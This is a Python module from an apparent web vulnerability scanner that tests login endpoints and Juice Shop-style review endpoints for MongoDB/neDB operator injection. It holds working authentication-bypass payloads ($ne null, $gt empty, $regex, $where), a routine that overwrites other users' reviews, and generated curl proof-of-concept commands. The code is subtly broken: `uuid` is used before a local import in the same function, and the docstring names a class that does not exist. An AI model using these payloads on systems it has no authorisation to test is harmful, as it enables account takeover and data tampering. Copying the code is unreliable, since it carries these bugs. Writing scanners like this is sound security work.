"""
NoSQL Injection checks:
  - NoSqlOperatorCheck  : MongoDB operator injection ($where, $gt, $ne, $regex)
  - NoSqlReviewsCheck   : Juice Shop neDB product reviews bypass
"""
import re
import uuid
import json as _json
from typing import Optional
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck

# MongoDB operator injection payloads (single-field injection)
_NOSQL_PAYLOADS_JSON = [
    # NodeGoat: usersCol.findOne({ userName: userName }) — inject object
    ({"$gt": ""},          "Greater-than empty string (always true)"),
    ({"$ne": None},        "Not-equal-null (matches any non-null value)"),
    ({"$ne": -1},          "Not-equal-negative (common bypass)"),
    ({"$regex": ".*"},     "Regex wildcard (matches everything)"),
    ({"$gt": -1},          "Greater-than -1 (always true for strings)"),
    ({"$in": ["admin", "administrator", "root", ""]}, "In-array with common usernames"),
    ({"$where": "1 == 1"}, "JavaScript where clause injection"),
]

# Full-body bypass payloads: both fields as operators
# NodeGoat: { "userName": {"$ne": null}, "password": {"$ne": null} }
_NOSQL_FULL_BYPASS = [
    # (email_field_value, password_field_value, description)
    ({"$ne": None}, {"$ne": None}, "Both fields $ne null — matches first user"),
    ({"$gt": ""},   {"$gt": ""},   "Both fields $gt empty — matches first user"),
    ({"$regex": "admin.*"}, {"$gt": ""}, "Admin regex + password bypass"),
]

# URL-encoded PHP-style bracket injection (for URL params)
_NOSQL_PAYLOADS_URL = [
    ("[$gt]=&password[$gt]=", "PHP bracket operator in URL params"),
    ("[%24gt]=&password[%24gt]=", "Encoded dollar-bracket operator"),
]


class NoSqlLoginBypassCheck(BaseScanCheck):
    """
    Tests JSON login endpoints for MongoDB operator injection.
    Sends email/password as MongoDB operators instead of strings.
    """
    check_id = "nosql-login"
    check_type = CheckType.ACTIVE
    name = "NoSQL Injection (Login Bypass)"
    description = "Detects MongoDB operator injection in authentication endpoints"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        if not any(k in url_lower for k in ("login", "auth", "signin", "session")):
            return []
        if not any(k in name_lower for k in ("email", "user", "username", "password")):
            return []
        if insertion_point.ip_type != IPType.JSON_KEY:
            return []

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        success_indicators = ("token", "authentication", "access_token", "success",
                              "session", "jwt", "user", "userid", "email", "role")

        # Noise test: fully random creds must fail
        noise_user = f"nonexistent_{uuid.uuid4().hex[:8]}@nexus.invalid"
        try:
            noise_resp = await client.post(
                insertion_point.url,
                json={insertion_point.name: noise_user, "password": "WrongPass123!"},
                headers={"Content-Type": "application/json"},
            )
            if noise_resp.status_code == 200 and any(k in noise_resp.text.lower() for k in success_indicators):
                return []  # Always succeeds — not injectable
        except Exception:
            pass

        # Try full-body bypass (both fields as operators) — NodeGoat pattern
        for email_val, pass_val, full_desc in _NOSQL_FULL_BYPASS:
            try:
                for user_field in (insertion_point.name, "userName", "username", "email", "user"):
                    for pass_field in ("password", "passwd", "pass"):
                        body = {user_field: email_val, pass_field: pass_val}
                        resp = await client.post(
                            insertion_point.url,
                            json=body,
                            headers={"Content-Type": "application/json"},
                        )
                        if resp.status_code == 200 and any(k in resp.text.lower() for k in success_indicators):
                            payload_str = _json.dumps(body)
                            return [CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.CRITICAL,
                                cvss=9.8,
                                description=(
                                    f"NoSQL injection login bypass confirmed! {full_desc}. "
                                    f"Both {user_field!r} and {pass_field!r} set to MongoDB operators — "
                                    f"bypasses findOne() authentication check. Noise test failed correctly."
                                ),
                                evidence=self._make_evidence(
                                    request_raw=(
                                        f"POST {insertion_point.url} HTTP/1.1\n"
                                        f"Content-Type: application/json\n\n{payload_str}"
                                    ),
                                    response=resp,
                                    payload=payload_str,
                                    poc_curl=(
                                        f"# NoSQL injection bypass (NodeGoat/MongoDB pattern):\n"
                                        f"curl -s -X POST '{insertion_point.url}' \\\n"
                                        f"  -H 'Content-Type: application/json' \\\n"
                                        f"  -d '{payload_str}'"
                                    ),
                                ),
                                insertion_point=insertion_point,
                            )]
            except Exception:
                continue

        import uuid as _uuid
        for op_payload, desc in _NOSQL_PAYLOADS_JSON:
            try:
                body = {insertion_point.name: op_payload, "password": {"$gt": ""}}
                resp = await client.post(
                    insertion_point.url,
                    json=body,
                    headers={"Content-Type": "application/json"},
                )
                body_text = resp.text.lower()

                if resp.status_code == 200 and any(
                    k in body_text for k in success_indicators
                ):
                    payload_str = _json.dumps(body)
                    req_raw = (
                        f"POST {parsed.path} HTTP/1.1\n"
                        f"Host: {parsed.netloc}\n"
                        f"Content-Type: application/json\n\n"
                        f"{payload_str}"
                    )
                    curl = (
                        f"curl -s -X POST '{insertion_point.url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{payload_str}'"
                    )
                    return [CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"NoSQL injection login bypass confirmed! {desc}. "
                            f"MongoDB operator {list(op_payload.keys())[0]!r} bypassed authentication. "
                            f"Full admin access achieved without valid credentials."
                        ),
                        evidence=self._make_evidence(
                            request_raw=req_raw,
                            response=resp,
                            payload=payload_str,
                            poc_curl=curl,
                        ),
                        insertion_point=insertion_point,
                    )]
            except Exception:
                continue

        return []


class NoSqlReviewsCheck(BaseScanCheck):
    """
    Tests Juice Shop's product reviews endpoint for NoSQL/neDB injection.
    The reviews API uses neDB which supports MongoDB-like operators.
    Target: GET /rest/products/search?q=...
            PATCH /rest/products/*/reviews
    """
    check_id = "nosql-reviews"
    check_type = CheckType.ACTIVE
    name = "NoSQL Injection (Product Reviews)"
    description = "Detects NoSQL injection in product review endpoints via operator injection"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()

        # Only fire on review/feedback-related endpoints
        if not any(k in url_lower for k in ("review", "feedback", "comment", "rating")):
            return []

        if getattr(self.__class__, '_attempted', False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Get auth token (regular user)
        uid = uuid.uuid4().hex[:8] if True else ""
        import uuid
        uid = uuid.uuid4().hex[:8]
        email = f"nosql_{uid}@nexus.invalid"
        password = "NexusP@ss1!"

        try:
            await client.post(f"{base}/api/Users",
                json={"email": email, "password": password, "passwordRepeat": password,
                      "username": "nosql", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                headers={"Content-Type": "application/json"})
            login = await client.post(f"{base}/rest/user/login",
                json={"email": email, "password": password},
                headers={"Content-Type": "application/json"})
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            auth = {"Authorization": f"Bearer {token}", "Cookie": f"token={token}"}
        except Exception:
            return []

        # Test PATCH /rest/products/{id}/reviews with NoSQL operator injection
        # This modifies ALL reviews when author matches the injected operator
        nosql_payloads = [
            ('{"author":{"$gt":""},"message":"nosql_probe"}', "gt-operator author match"),
            ('{"author":"admin@juice-sh.op","message":"nosql_test"}', "admin-author injection"),
        ]

        for payload_str, desc in nosql_payloads:
            try:
                # First find a product ID
                products = await client.get(f"{base}/rest/products/search?q=juice")
                product_id = 1  # Default
                if products.status_code == 200:
                    items = re.findall(r'"id"\s*:\s*(\d+)', products.text)
                    if items:
                        product_id = int(items[0])

                resp = await client.patch(
                    f"{base}/rest/products/{product_id}/reviews",
                    json=_json.loads(payload_str),
                    headers={**auth, "Content-Type": "application/json"},
                )

                if resp.status_code == 200:
                    resp_data = resp.json()
                    # If nModified > 0, we modified reviews we shouldn't own
                    modified = resp_data.get("data", {}).get("nModified", 0)
                    if modified > 0:
                        req_raw = (
                            f"PATCH /rest/products/{product_id}/reviews HTTP/1.1\n"
                            f"Authorization: Bearer <TOKEN>\n"
                            f"Content-Type: application/json\n\n"
                            f"{payload_str}"
                        )
                        return [CheckResult(
                            check_id=self.check_id,
                            vulnerable=True,
                            confidence=Confidence.CERTAIN,
                            severity=Severity.CRITICAL,
                            cvss=9.1,
                            description=(
                                f"NoSQL injection confirmed in reviews! {desc}. "
                                f"Modified {modified} reviews belonging to other users. "
                                f"Payload: {payload_str}"
                            ),
                            evidence=self._make_evidence(
                                request_raw=req_raw,
                                response=resp,
                                payload=payload_str,
                                poc_curl=(
                                    f"curl -s -X PATCH '{base}/rest/products/{product_id}/reviews' "
                                    f"-H 'Authorization: Bearer TOKEN' "
                                    f"-H 'Content-Type: application/json' "
                                    f"-d '{payload_str}'"
                                ),
                            ),
                            insertion_point=insertion_point,
                        )]
            except Exception:
                continue

        return []
